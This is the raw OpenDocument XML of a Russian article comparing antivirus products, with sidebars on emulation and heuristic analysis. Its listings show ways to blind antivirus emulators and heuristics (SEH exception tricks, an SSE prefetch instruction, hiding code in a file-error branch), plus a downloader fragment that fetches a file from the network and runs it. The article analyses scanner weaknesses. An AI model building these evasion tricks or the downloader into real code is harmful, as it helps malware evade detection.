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5.934cm"/>
    </style:style>
    <style:style style:name="Таблица1.B" style:family="table-column">
      <style:table-column-properties style:column-width="1.009cm"/>
    </style:style>
    <style:style style:name="Таблица1.C" style:family="table-column">
      <style:table-column-properties style:column-width="1.499cm"/>
    </style:style>
    <style:style style:name="Таблица1.D" style:family="table-column">
      <style:table-column-properties style:column-width="2.193cm"/>
    </style:style>
    <style:style style:name="Таблица1.E" style:family="table-column">
      <style:table-column-properties style:column-width="1.558cm"/>
    </style:style>
    <style:style style:name="Таблица1.F" style:family="table-column">
      <style:table-column-properties style:column-width="1.501cm"/>
    </style:style>
    <style:style style:name="Таблица1.G" style:family="table-column">
      <style:table-column-properties style:column-width="1.356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G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en" fo:country="US"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="8pt" fo:font-weight="bold" style:font-size-asian="8pt" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="8pt" fo:language="en" fo:country="US" fo:font-weight="bold" style:font-size-asian="8pt" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="8pt" fo:language="en" fo:country="US" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:snap-to-layout-grid="false"/>
      <style:text-properties fo:font-size="8pt" fo:language="en" fo:country="US" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="8pt" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="8pt" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" style:snap-to-layout-grid="false"/>
      <style:text-properties fo:font-size="8pt" style:font-size-asian="8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Courier New" fo:font-size="8pt"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Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-indent="1.27cm" style:auto-text-indent="false"/>
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Название_20_объекта">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P16"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size="8pt" fo:font-weight="bold" style:font-size-asian="8pt" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-size="8pt" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-size="8pt" fo:language="en" fo:country="US" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:background-color="#ff0000"/>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language="en" fo:country="US" fo:font-weight="bold" style:font-size-asian="8pt" style:font-weight-asian="bold" style:font-name-complex="Courier New" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="8pt" fo:font-weight="bold" style:font-size-asian="8pt" style:font-weight-asian="bold" style:font-name-complex="Courier New"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6" text:outline-level="1">антивирусы в корпоративной среде<text:span text:style-name="T1"><text:line-break/>(</text:span>дополнения)</text:h>
      <text:p text:style-name="P1">крис касперски, ака мыщъх, no-email</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T1">&gt;&gt;&gt; </text:span>врезка сравнительная характеристика различных антивирусов</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office:value-type="string">
            <text:p text:style-name="P2">*</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P3">KAV</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P3">Dr. Web</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P3">Trend-Micro</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P3">Symantec</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P3">NOD32</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.G1" office:value-type="string">
            <text:p text:style-name="P3">McAfee</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P6">коэффициент детекции на эвристике</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">13%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">16%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">0%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">7%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">87%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.G1" office:value-type="string">
            <text:p text:style-name="P4">33%</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="Standard"><text:span text:style-name="T3">кол-во наград </text:span><text:span text:style-name="T4">VB100% (virus bulletin) </text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">36</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">39</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">15</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">36</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">42</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.G1" office:value-type="string">
            <text:p text:style-name="P4">28</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="Standard"><text:span text:style-name="T3">кол-во нераспознаваемых вирусов с </text:span><text:span text:style-name="T4">'</text:span><text:span text:style-name="T3">98 по </text:span><text:span text:style-name="T4">'</text:span><text:span text:style-name="T3">07</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">33</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">27</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">68</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">29</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.G1" office:value-type="string">
            <text:p text:style-name="P4">64</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="Standard"><text:span text:style-name="T3">процент распознавания 16-</text:span><text:span text:style-name="T4">days</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T4">old </text:span><text:span text:style-name="T3">вирусов</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">7%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">10%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">0%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">7%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">87%</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.G1" office:value-type="string">
            <text:p text:style-name="P7">33%</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P6">среднее кол-во обновлений в неделю</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">150</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">н/д</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">16</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.G1" office:value-type="string">
            <text:p text:style-name="P4">5</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P6">унифицированный эвристический сканер</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G1" office:value-type="string">
            <text:p text:style-name="P7">-</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P6">эвристический анализатор</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">+</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P8"/>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7">+</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.G1" office:value-type="string">
            <text:p text:style-name="P4">+</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="Standard"><text:span text:style-name="T3">детектор общих сигнатур (</text:span><text:span text:style-name="T4">genetic signatures)</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">+</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">+</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6">эмулятор ЦП</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P7">+</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P8"/>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7">+</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.G1" office:value-type="string">
            <text:p text:style-name="P4">+</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="Standard"><text:span text:style-name="T3">продвинутый (</text:span><text:span text:style-name="T4">advanced) </text:span><text:span text:style-name="T3">эмулятор ЦП</text:span></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6">эмуляция стека</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G1" office:value-type="string">
            <text:p text:style-name="P7">-</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="Standard"><text:span text:style-name="T3">эмуляция </text:span><text:span text:style-name="T4">SSE</text:span><text:span text:style-name="T3"> команд</text:span></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G1" office:value-type="string">
            <text:p text:style-name="P7">-</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="Standard"><text:span text:style-name="T3">эмулятор </text:span><text:span text:style-name="T4">API-</text:span><text:span text:style-name="T3">функций </text:span><text:span text:style-name="T4">Windows</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">-</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P5"/>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6">эмуляция самомодифицирующегося кода</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G1" office:value-type="string">
            <text:p text:style-name="P7">-</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="Standard"><text:span text:style-name="T3">детектор фишинга (phishing </text:span><text:span text:style-name="T4">detector)</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P4">-</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="P5"/>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Standard"><text:span text:style-name="T3">противодействие </text:span><text:span text:style-name="T4">WM_</text:span><text:span text:style-name="T3"> атакам</text:span></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A1" office:value-type="string">
            <text:p text:style-name="P7">+</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Таблица1.G1" office:value-type="string">
            <text:p text:style-name="P7">-</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="Таблица1.1">
          <table:table-cell table:style-name="Таблица1.A1" office:value-type="string">
            <text:p text:style-name="Standard"><text:span text:style-name="T3">сертификат </text:span><text:span text:style-name="T4">ICSA</text:span></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
      <text:p text:style-name="P15">Таблица<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refTable0" text:name="Table" text:formula="ooow:Table+1" style:num-format="1">1</text:sequence><text:span text:style-name="T1"> </text:span>сравнительная характеристика различных антивирусов по данным ESET, <text:span text:style-name="body2">AV-Comparatives, </text:span><text:span text:style-name="body2"><text:span text:style-name="T1">Virus Total </text:span></text:span><text:span text:style-name="body2">и </text:span><text:span text:style-name="body2"><text:span text:style-name="T1">Virus Bulletin</text:span></text:span></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T1">&gt;&gt;&gt; </text:span>врезка технологии эмуляции</text:h>
      <text:p text:style-name="P13">Виртуальная машина, эмулирующая ЦП, необходима антивирусу по меньшей для трех целей: а) распаковки файлов, упакованных неизвестным упаковщиком, б) борьбы с "джойнерами", объединяющими известный вирус с "честной" программой в один исполняемый файл; в) распознанию неизвестных вирусов.</text:p>
      <text:p text:style-name="P13">Самые мощные эмуляторы реализованы в <text:span text:style-name="T1">NOD32, KAV</text:span> и<text:span text:style-name="T1"> Dr. Web</text:span>. Они реализуют достаточно полный набор арифметическо-логических команд <text:span text:style-name="T1">x86 </text:span>процессоров (<text:span text:style-name="T1">generic x86 command set)</text:span>, однако, все еще не эмулируют <text:span text:style-name="T1">SSE-</text:span>команды, самомодифицирующийся код, структурные исключения и <text:span text:style-name="T1">API-</text:span>функции операционной системы, а потому принципиально неспособны распаковывать вирусы, обработанные навороченными протекторами или упаковщиками исполняемых файлов, которые приходится распаковывать на статических распаковщиках, написанных вручную.</text:p>
      <text:p text:style-name="P13">В частности, следующий код (<text:span text:style-name="T5">см. листинг 1</text:span>) передает управление на тело вируса путем возбуждения исключения типа "ошибка доступа", о которой не подозревает ни один из трех обозначенных антивирусов и все они видят здесь лишь невинный возврат из функции.</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">PUSH 00315E01h<text:tab/><text:tab/><text:tab/><text:tab/>; </text:span><text:span text:style-name="T6">адрес скрытой вирусной процедуры</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7"><text:tab/>PUSH dword ptr FS:[00000000h]</text:span><text:span text:style-name="T6"><text:tab/><text:tab/></text:span><text:span text:style-name="T7">; </text:span><text:span text:style-name="T6">адрес предыдущего </text:span><text:span text:style-name="T7">SEH-</text:span><text:span text:style-name="T6">обработчика</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7"><text:tab/>MOV dword ptr FS:[00000000h], ESP</text:span><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">; </text:span><text:span text:style-name="T6">регистрируем новый </text:span><text:span text:style-name="T7">SEH-</text:span><text:span text:style-name="T6">обработчик</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7"><text:tab/>MOV EAX, dword ptr DS:[00000000h]</text:span><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">; </text:span><text:span text:style-name="T6">возбуждаем исключение, передавая</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T7">; </text:span><text:span text:style-name="T6">управление на скрытую вирусную</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7"><text:tab/></text:span><text:span text:style-name="T6"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T7">; </text:span><text:span text:style-name="T6">процедуру (антивирусы этого не видят)</text:span></text:p>
      <text:p text:style-name="P11"><text:tab/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">RET<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>; </text:span><text:span text:style-name="T6">выходим из функции</text:span></text:p>
      <text:p text:style-name="P15">Листинг <text:sequence text:ref-name="refЛистинг0" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">1</text:sequence> ослепление эмулятора путем возбуждения исключения</text:p>
      <text:p text:style-name="P13">Аналогичным образом обстоят дела и с эвристическим анализом. Поскольку, процессоры семейства <text:span text:style-name="T1">x86 </text:span>имеют переменную длину машинных команд, встреча с неизвестной инструкцией делает дальнейшее декодирование потока выполнения невозможным.</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6">0</text:span><text:span text:style-name="T7">F</text:span><text:span text:style-name="T6"> 18 00<text:tab/></text:span><text:span text:style-name="T8">PREFECTCH</text:span><text:span text:style-name="T9"> [</text:span><text:span text:style-name="T8">EAX</text:span><text:span text:style-name="T9">]</text:span><text:span text:style-name="T8"><text:tab/><text:tab/>; SSE </text:span><text:span text:style-name="T9">команда (неизвестная </text:span><text:span text:style-name="T8">AVs'</text:span><text:span text:style-name="T9">ам)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7">B8 01 E0 15 03<text:tab/>MOV EAX, 00315E01h</text:span><text:span text:style-name="T6"><text:tab/><text:tab/></text:span><text:span text:style-name="T7">; </text:span><text:span text:style-name="T6">заносим адрес вирусной процедуры в </text:span><text:span text:style-name="T7">EAX</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7">FF E0<text:tab/><text:tab/>JMP EAX<text:tab/><text:tab/><text:tab/><text:tab/>; </text:span><text:span text:style-name="T6">передаем управление вирусной процедуре</text:span></text:p>
      <text:p text:style-name="P15"><text:soft-page-break/>Листинг <text:sequence text:ref-name="refЛистинг1" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">2</text:sequence> ослепление эвристического анализатора путем использования <text:span text:style-name="T1">SSE-</text:span>команды <text:span text:style-name="T1">prefetch [eax] (</text:span>предвыбрка из памяти)</text:p>
      <text:p text:style-name="P13">В частности, встретив <text:span text:style-name="T1">SSE-</text:span>команду prefetch<text:span text:style-name="T1"> </text:span>[eax] (<text:span text:style-name="T5">см. листинг 2</text:span>), ни <text:span text:style-name="T1">KAV</text:span>, ни <text:span text:style-name="T1">Dr. Web </text:span>даже не пытаются продолжить выполнение потока инструкций. <text:span text:style-name="T1">NOD32 </text:span>пытается, но это у него мягко говоря не совсем получается. Анализ внутренних цепей эмулятора, выполненный автором, показывает, что <text:span text:style-name="T1">NOD32 </text:span>декодирует код следующим образом (<text:span text:style-name="T5">см. листинг 3</text:span>).</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6">0</text:span><text:span text:style-name="T7">F</text:span><text:span text:style-name="T6"> 18<text:tab/></text:span><text:span text:style-name="T7"><text:tab/><text:tab/>unknown</text:span><text:span text:style-name="T6"><text:tab/><text:tab/></text:span><text:span text:style-name="T8"><text:tab/>; NOD32 </text:span><text:span text:style-name="T9">не знает такой команды</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">00 </text:span><text:span text:style-name="T7">B8 01 E0 15 03<text:tab/>ADD [EAX+00315E01h],BH</text:span><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">; </text:span><text:span text:style-name="T6">добавить к ячейке </text:span><text:span text:style-name="T7">EAX+00315E01h</text:span><text:span text:style-name="T6"> рег. </text:span><text:span text:style-name="T7">BH</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7">FF E0<text:tab/><text:tab/><text:tab/>JMP EAX<text:tab/><text:tab/><text:tab/>; </text:span><text:span text:style-name="T6">прыгнуть на </text:span><text:span text:style-name="T7">EAX</text:span></text:p>
      <text:p text:style-name="P15">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг2" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">3</text:sequence><text:span text:style-name="T1"> </text:span>так <text:span text:style-name="T1">NOD32 </text:span>декодирует <text:span text:style-name="T5">листинг 2</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T1">NOD32</text:span>, столкнувшись с неизвестную ему <text:span text:style-name="T1">SSE-</text:span>командой prefetch<text:span text:style-name="T1"> </text:span>[eax], пытается определить ее границы эвристическим путем, чтобы продолжить декодирование остального потока инструкций, но делает это неверно, ошибочно отрывая один байт от prefetch<text:span text:style-name="T1"> </text:span>[eax] и присваивая его следующей за ним машинной команде, в результате чего MOV EAX,00315E01h (занести в регистр <text:span text:style-name="T1">EAX </text:span>значение 00315E01h) превращается в ADD [EAX+00315E01h],BH (сложить содержимое ячейки EAX+00315E01h с регистром <text:span text:style-name="T1">BH)</text:span>. Как следствие — регистр <text:span text:style-name="T1">EAX </text:span>остается неинициализированным и по команде <text:span text:style-name="T1">JMP EAX </text:span>эмулятор переходит в "космос", стреляя мимо вирусной процедуры.</text:p>
      <text:p text:style-name="P13">Тем не менее, в некоторых случаях <text:span text:style-name="T1">NOD'</text:span>у все же удается угадать границы неизвестных ему машинных команд и декодировать остальной поток инструкций, к тому же, в отличии от <text:span text:style-name="T1">KAV'</text:span>а<text:span text:style-name="T1"> </text:span>и <text:span text:style-name="T1">Dr. Web'</text:span>а он эмулирует стек, отслеживая некоторые хитрые способы передачи управления (типа модификации адреса возврата).</text:p>
      <text:p text:style-name="P13">Если же декодировать поток инструкций не удается, то все три обозначенных антивируса ищут в файле так называемые "общие вирусные сигнатуры" (<text:span text:style-name="T1">genetic signatures)</text:span>, то есть последовательности машинных команд, характерные для вирусов, но редко встречающиеся в честном программном обеспечении.</text:p>
      <text:p text:style-name="P13">В частности, следующий фрагмент (<text:span text:style-name="T5">см. листинг 4</text:span>) вызывает срабатывание эвристического анализатора всех трех обозначенных антивирусов независимо от того, удалось ли эмулятору декодировать поток инструкций или нет:</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6"><text:tab/>; // получаем путь к каталогу %</text:span><text:span text:style-name="T7">TEMP</text:span><text:span text:style-name="T6">%</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">invoke GetTempPath, 256, <text:s/>WinTempDir</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T7"><text:tab/></text:span><text:span text:style-name="T6">; // копируем имя каталога %</text:span><text:span text:style-name="T7">TEMP</text:span><text:span text:style-name="T6">% в буфер </text:span><text:span text:style-name="T7">FullPath</text:span><text:span text:style-name="T6">,</text:span></text:p>
      <text:p text:style-name="P10"><text:tab/>; // добавляя туда его имя, под которым он будет записан на диск</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">invoke lstrcpy, FullPath, WinTempDir</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">invoke lstrcat, FullPath, FileNameToSave</text:span></text:p>
      <text:p text:style-name="P10"><text:tab/></text:p>
      <text:p text:style-name="P10"><text:tab/>; // скачиваем файл из сети</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">invoke URLDownloadToFile, 0, UrlOfFile, FullPath, 0, 0</text:span></text:p>
      <text:p text:style-name="P10"><text:tab/></text:p>
      <text:p text:style-name="P10"><text:tab/>; // запускаем скаченный файл</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">invoke ShellExecute, NULL, NULL, <text:s/>FullPath, NULL, NULL,1</text:span></text:p>
      <text:p text:style-name="P15">Листинг <text:sequence text:ref-name="refЛистинг3" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">4</text:sequence> вирусный фрагмент, скачивающий файл из сети и тут же его запускающий</text:p>
      <text:p text:style-name="P13">Антивирусы <text:span text:style-name="T1">Symantec </text:span>и <text:span text:style-name="T1">McAfee </text:span>формально поддерживают эвристический анализатор, однако, эмулируют лишь небольшой набор <text:span text:style-name="T1">x86-</text:span>инструкций, органически неспособный распаковывать неизвестные упаковщики и справляющийся только с простейшими вирусами, поэтому надеяться словить заразу, отсутствующую в базе, с их помощью — наивно, причем базы у них обновляются значительно реже чем у <text:span text:style-name="T1">KAV'</text:span>а и <text:span text:style-name="T1">NOD'</text:span>а (<text:span text:style-name="T5">см. таблицу 1</text:span>), причем, <text:span text:style-name="T1">McAfee </text:span>(и в меньшей степени <text:span text:style-name="T1">Symantec) </text:span>страдают хроническим "пропуском" вирусов, занося их в базы со значительным опозданием или же не занося их вообще.</text:p>
      <text:p text:style-name="P13">Антивирус <text:span text:style-name="T1">Trend-Micro </text:span>вообще не поддерживает технологий эмуляции, редко обновляет базы и пропускает множество вирусов, с которыми легко справляются его конкуренты.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:span text:style-name="T1">&gt;&gt;&gt; </text:span>врезка эмуляция <text:span text:style-name="T1">API-</text:span>функций <text:span text:style-name="T1">Windows</text:span></text:h>
      <text:p text:style-name="P13">Эмулировать <text:span text:style-name="T1">API-</text:span>функции операционной системы ни один из антивирусов пока что не научился, что открывает широкие просторы для хакерства. Ладно, если бы антивирусы их совсем не эмулировали, так ведь нет! Они пытаются предсказать результат выполнения некоторых, наиболее распространенных функций, в частности, полагая, что функция открытия <text:soft-page-break/>файла <text:span text:style-name="T1">CreateFileA </text:span>всегда возвращает позитивный результат и никогда не заглядывают в обработчик ситуации INVALID_HANDLE_VALUE (неверный дескриптор файла).</text:p>
      <text:p text:style-name="P13">Следующий код обманывает эвристические анализаторы всех, рассматриваемых нами, антивирусов:</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T7"><text:tab/></text:span><text:span text:style-name="T6">HANDLE h = CreateFileA("</text:span><text:span text:style-name="T7">C:\</text:span><text:span text:style-name="T6">System</text:span><text:span text:style-name="T7"> </text:span><text:span text:style-name="T6">Volume</text:span><text:span text:style-name="T7"> </text:span><text:span text:style-name="T6">Information",</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T7"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T6">FILE_READ_ACCESS, 0, 0, OPEN_EXISTING, 0, NULL);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T7"><text:tab/></text:span><text:span text:style-name="T6">if (h != INVALID_HANDLE_VALUE)</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T7"><text:tab/></text:span><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T7"><text:tab/></text:span><text:span text:style-name="T6"><text:tab/></text:span><text:span text:style-name="T7">/* </text:span><text:span text:style-name="T6">вирусная процедура </text:span><text:span text:style-name="T7">*/</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T7"><text:tab/></text:span><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P15">Листинг <text:sequence text:ref-name="refЛистинг4" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">5</text:sequence> ослепление эвристического анализатора путем размещения вирусной процедуры в обработчике ошибки открытия файла C:\System Volume Information, который на <text:span text:style-name="T1">NTFS-</text:span>разделах недоступен даже для чтения</text:p>
